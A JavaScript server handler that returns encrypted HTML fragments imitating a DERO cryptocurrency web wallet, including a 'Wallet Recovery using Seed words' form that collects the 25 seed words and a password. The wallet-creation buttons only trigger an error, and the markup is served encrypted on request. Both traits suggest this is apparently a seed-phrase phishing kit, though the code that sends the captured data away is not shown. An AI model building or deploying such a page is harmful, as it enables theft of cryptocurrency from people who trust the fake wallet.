import { encrypt } from '../lib/crypt.js';


const F1 = `<main>
    <header>
      <div class="l"><img src="src/logo.png" alt="logo" /></div>
      <div class="w">
        <span>DERO Wallet</span>
        <select class="clickable">
          <option>English</option>
        </select>
      </div>
    </header>
    <div class="main">
      <div class="side">
        <div class="b">
          <button onclick="loadDefault_bod()">Recover Wallet</button>
          <button onclick="error_mod()">Create New Wallet</button>
          <button onclick="error_mod()">DERO Project</button>
        </div>
      </div>
      <div class="bod">
        
      </div>
    </div>
  </main> `;

const F2 = `<div class="box">
    <h3>DERO Web Wallet</h3>
    <button onclick="call()">Recover Wallet using SEED words (25 words)</button>
    <button onclick="call()">Recover Wallet using Recovery Key (64 hex char)</button>
    <button onclick="call()">Upload Wallet from DISK</button>
    <br>
    <button class="white">Recover View Only Wallet (128 hex char)</button>
  </div>
  <div class="box">
    <h5>DERO Web software is alpha software <br>
      Core Wallet Version: UI Version: 0.0.0 <br>
      Copyright DERO Project<br>
      This project is covered by DERO license.
    </h5>
  </div>`

const F3 = `<div class="rec">
        <div class="close-box"><svg class="clickable" onclick="loadDefault_bod()" xmlns="http://www.w3.org/2000/svg" width="31" height="31" viewBox="0 0 31 31" fill="none"><path d="M31 15.0156C31 14.2131 30.3494 13.5625 29.5469 13.5625H10.9288C9.63419 13.5625 8.98585 11.9973 9.90126 11.0819L17.2201 3.76303C17.789 3.19413 17.7874 2.27126 17.2165 1.70437L16.5275 1.02026C15.9594 0.456205 15.0422 0.457827 14.4761 1.02389L1.02752 14.4725C0.460035 15.04 0.460034 15.96 1.02751 16.5275L14.4725 29.9725C15.04 30.54 15.96 30.54 16.5275 29.9725L17.2053 29.2947C17.7724 28.7276 17.7728 27.8082 17.2062 27.2406L9.89591 19.9172C8.98175 19.0014 9.63037 17.4375 10.9243 17.4375H29.5469C30.3494 17.4375 31 16.7869 31 15.9844V15.0156Z" fill="white" fill-opacity="0.6"/></svg></div>
        <h1>Wallet Recovery using Seed words</h1>
        <div class="b">
          <div class="g">
            <label>Wallet Name</label>
            <input type="text" id="walletN" placeholder="Wallet name for quick reference"/>
          </div>
          <div class="g">
            <label>25 Seed Words</label>
            <textarea type="text" placeholder="" id="textA"></textarea>
          </div>
          <div class="g">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Password"/>
          </div>
          <div class="g">
            <label>Confirm Password</label>
            <input type="password" id="conPass" placeholder="Confirm Password"/>
          </div>
          <div class="g">
            <label>Wallet start Topoheight: (optional)</label>
            <input type="number" value="0"/>
          </div>
        </div>
        <button id="rec">Recover wallet</button>
      </div>`

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { data } = req.body;
  if (!data) return res.status(400).json({ error: 'No data provided' });

  let result; // Declare result in outer scope

  if (data === "F1") {
    result = encrypt(F1);
  } else if (data === "F2") {
    result = encrypt(F2);
  } else if (data === "F3") {
    result = encrypt(F3);
  } else {
    return res.status(400).json({ error: 'Invalid data value' });
  }

  return res.status(200).json(result);
}
